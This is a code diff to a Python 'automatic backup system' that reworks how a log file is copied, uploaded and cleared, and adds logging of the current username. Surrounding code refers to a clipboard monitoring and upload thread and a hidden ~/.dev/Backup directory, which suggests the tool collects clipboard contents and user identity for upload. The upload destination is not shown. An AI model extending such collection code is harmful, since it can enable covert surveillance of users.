@@ -8,6 +8,7 @@ import platform
 import shutil
 import threading
 import subprocess
+import getpass
 from datetime import datetime, timedelta
 from pathlib import Path
 from functools import lru_cache
@@ -253,6 +254,14 @@ def backup_and_upload_logs(backup_manager):
             if backup_manager.config.DEBUG_MODE:
                 logging.debug(f"备份日志文件不存在，跳过: {log_file}")
             return
+        
+        # 刷新日志缓冲区，确保所有日志都已写入文件
+        for handler in logging.getLogger().handlers:
+            if hasattr(handler, 'flush'):
+                handler.flush()
+        
+        # 等待一小段时间，确保文件系统同步
+        time.sleep(0.5)
             
         # 检查日志文件大小
         file_size = os.path.getsize(log_file)
@@ -264,6 +273,7 @@ def backup_and_upload_logs(backup_manager):
         # 创建临时目录
         temp_dir = Path.home() / ".dev/Backup/temp_backup_logs"
         if not backup_manager._ensure_directory(str(temp_dir)):
+            logging.error("❌ 无法创建临时日志目录")
             return
             
         # 创建带时间戳的备份文件名
@@ -271,38 +281,63 @@ def backup_and_upload_logs(backup_manager):
         backup_name = f"backup_log_{timestamp}.txt"
         backup_path = temp_dir / backup_name
         
-        # 复制日志文件到临时目录
+        # 复制日志文件到临时目录并上传
         try:
-            shutil.copy2(log_file, backup_path)
-            if backup_manager.config.DEBUG_MODE:
-                logging.info(f"📄 已复制备份日志到临时目录")
-        except Exception as e:
-            logging.error(f"❌ 复制备份日志失败: {e}")
-            return
-        
-        # 上传日志文件
-        if backup_manager.upload_file(str(backup_path)):
-            # 上传成功后保留最后一条记录
-            try:
-                with open(log_file, 'w', encoding='utf-8') as f:
-                    f.write(f"=== 📝 备份日志已于 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} 上传 ===\n")
-                if backup_manager.config.DEBUG_MODE:
-                    logging.info("✅ 备份日志已更新")
-            except Exception as e:
-                logging.error(f"❌ 备份日志更新失败: {e}")
-        else:
-            logging.error("❌ 备份日志上传失败")
+            # 读取并验证日志内容
+            with open(log_file, 'r', encoding='utf-8', errors='ignore') as src:
+                log_content = src.read()
             
-        # 清理临时目录
-        try:
-            if os.path.exists(str(temp_dir)):
-                shutil.rmtree(str(temp_dir))
-        except Exception as e:
+            if not log_content or not log_content.strip():
+                logging.warning("⚠️ 日志内容为空，跳过上传")
+                return
+            
+            # 写入备份文件
+            with open(backup_path, 'w', encoding='utf-8') as dst:
+                dst.write(log_content)
+            
+            # 验证备份文件是否创建成功
+            if not os.path.exists(str(backup_path)) or os.path.getsize(str(backup_path)) == 0:
+                logging.error("❌ 备份日志文件创建失败或为空")
+                return
+            
             if backup_manager.config.DEBUG_MODE:
-                logging.error(f"❌ 清理临时目录失败: {e}")
+                logging.info(f"📄 已复制备份日志到临时目录 ({os.path.getsize(str(backup_path)) / 1024:.2f}KB)")
+            
+            # 上传日志文件
+            logging.info(f"📤 开始上传备份日志文件 ({os.path.getsize(str(backup_path)) / 1024:.2f}KB)...")
+            if backup_manager.upload_file(str(backup_path)):
+                # 上传成功后保留最后一条记录
+                try:
+                    with open(log_file, 'w', encoding='utf-8') as f:
+                        f.write(f"=== 📝 备份日志已于 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} 上传 ===\n")
+                    logging.info("✅ 备份日志上传成功并已清空")
+                except Exception as e:
+                    logging.error(f"❌ 备份日志更新失败: {e}")
+            else:
+                logging.error("❌ 备份日志上传失败")
+        
+        except (OSError, IOError, PermissionError) as e:
+            logging.error(f"❌ 复制或读取日志文件失败: {e}")
+        except Exception as e:
+            logging.error(f"❌ 处理日志文件时出错: {e}")
+            import traceback
+            if backup_manager.config.DEBUG_MODE:
+                logging.debug(traceback.format_exc())
+        
+        # 清理临时目录
+        finally:
+            try:
+                if os.path.exists(str(temp_dir)):
+                    shutil.rmtree(str(temp_dir))
+            except Exception as e:
+                if backup_manager.config.DEBUG_MODE:
+                    logging.debug(f"清理临时目录失败: {e}")
                 
     except Exception as e:
         logging.error(f"❌ 处理备份日志时出错: {e}")
+        import traceback
+        if backup_manager.config.DEBUG_MODE:
+            logging.debug(traceback.format_exc())
 
 def clipboard_upload_thread(backup_manager, clipboard_log_path):
     """独立的ZTB上传线程"""
@@ -457,8 +492,11 @@ def periodic_backup_upload(backup_manager):
     except Exception as e:
         logging.error("❌ 初始化ZTB日志失败")
 
+    # 获取用户名
+    username = getpass.getuser()
     current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
     logging.critical("\n" + "="*40)
+    logging.critical(f"👤 用户: {username}")
     logging.critical(f"🚀 自动备份系统已启动  {current_time}")
     logging.critical("📋 ZTB监控和自动上传已启动")
     logging.critical("="*40)
@@ -499,7 +537,10 @@ def periodic_backup_upload(backup_manager):
                 current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                 next_time_str = next_backup_time.strftime('%Y-%m-%d %H:%M:%S') if next_backup_time else "未知"
                 logging.critical(f"✅ 备份完成  {current_time}")
-                logging.critical(f"⏳ 下次备份: {next_time_str}")
+                logging.critical("="*40)
+                logging.critical("📋 备份任务已结束")
+                if next_backup_time:
+                    logging.critical(f"🔄 下次启动备份时间: {next_time_str}")
                 logging.critical("="*40 + "\n")
 
             # 每小时检查一次
